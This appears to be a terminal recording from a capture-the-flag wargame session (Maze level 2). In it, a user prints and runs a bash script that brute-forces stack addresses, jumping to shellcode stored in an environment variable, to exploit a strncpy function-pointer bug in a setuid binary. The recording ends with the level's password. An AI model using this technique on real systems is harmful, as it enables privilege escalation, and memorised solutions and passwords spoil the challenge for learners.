[128.858716, "o", "chmod +x sweep.sh && cat sweep.sh\r\r\n\u001b[?2004l\r\u001b]3008;start=2b38823f-a4eb-47b0-b6b9-bd6b54364ff1;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/l2exp\u001b\\#!/bin/bash\r\r\n# maze L2 sweep: strncpy(buf[12], argv[1], 8) then calls fp=&buf.\r\r\n# argv[1] = '\\x68' + target(LE) + '\\xc3' + 'AA' - push imm32(target);\r\r\n# ret, padded to the 8 bytes strncpy copies. The shellcode rides env\r\r\n# P = 2000 A's + sc.bin (NOP sled absorbs the layout uncertainty).\r\r\n# Stage 1 sweeps the known-hit window (0xffffd6d0-0xffffd720); stage 2\r\r\n# is the wider fallback 0xffffd000-0xffffe000.\r\r\nP=$(printf 'A%.0s' $(seq 2000))$(cat sc.bin)\r\r\nsweep() {\r\r\n  lo=$1; hi=$2\r\r\n  for t in $(seq $lo 4 $hi); do\r\r\n    T=$(printf '%08x' $t)\r\r\n    case \"$T\" in *00*) continue;; esac\r\r\n    A=$(printf \"\\\\x68\\\\x${T:6:2}\\\\x${T:4:2}\\\\x${T:2:2}\\\\x${T:0:2}\\\\xc3AA\")\r\r\n    out=$(P=\"$P\" /maze/maze2 \"$A\" 2>&1 </dev/null)\r\r\n    if [ -n \"$out\" ]; then echo \"HIT at 0x$T\"; printf '%s' \"$out\"; return 0; fi\r\r\n  done\r\r\n  return 1\r\r\n}\r\r\nif sweep $((0xffffd6d0)) $((0xffffd720)); then\r\r\n  echo SWEEPDONE\r\r\n  exit 0\r\r\nfi\r\r\necho \"stage1 miss, widening...\"\r\r\nsweep $((0xffffd000)) $((0xffffe000))\r\r\necho SWEEPDONE\r\r\n\r\r\n\u001b]3008;end=2b38823f-a4eb-47b0-b6b9-bd6b54364ff1;exit=success\u001b\\\u001b]3008;start=2a036b06-e882-4cbd-8e3c-ae490d5adbd8;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/l2exp\u001b\\\u001b[?2004h\u001b]0;maze2@maze: /tmp/l2exp\u0007maze2@maze:/tmp/l2exp$ ./sweep.sh\r\r\n\u001b[?2004l\r\u001b]3008;start=8062ada3-bb26-4a5d-8961-23ecfcbcd404;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/l2exp\u001b\\stage1 miss, widening...\r\r\nHIT at 0xffffd010\r\r\npKWcO3NfC6\r\r\npKWcO3NfC6SWEEPDONE\r\r\n\u001b]3008;end=8062ada3-bb26-4a5d-8961-23ecfcbcd404;exit=success\u001b\\\u001b]3008;start=2a036b06-e882-4cbd-8e3c-ae490d5adbd8;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/l2exp\u001b\\\u001b[?2004h\u001b]0;maze2@maze: /tmp/l2exp\u0007maze2@maze:/tmp/l2exp$ "]
